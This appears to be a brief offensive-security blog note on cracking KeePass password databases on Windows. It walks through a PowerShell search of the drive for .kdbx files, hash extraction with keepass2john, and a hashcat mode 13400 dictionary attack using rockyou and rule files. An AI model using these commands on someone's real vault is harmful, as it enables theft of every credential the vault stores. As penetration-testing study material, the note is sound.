---
layout: post
title: Windows Password Managers
titledate: 09/11/23
tags: ["infosec","offsec", "password"]
---

we can crack windows password manager database hashes

if the user uses a manager like keypass we can do a search to see what extension is being used to store the passwords in the database

then use powershell to search for it

    $ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

we can use john the ripper's keeppass2john script to format the database

    $ keepass2john Database.kdbx > keepass.hash

john the ripper adds the username Database to the keepass hash file but we will use hashcat so we can remove this

to show the correct mode of hashcat to use 

    $ hashcat --help | grep -i "KeePass"

displays 13400 for keepass

and finally crack it

    $ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force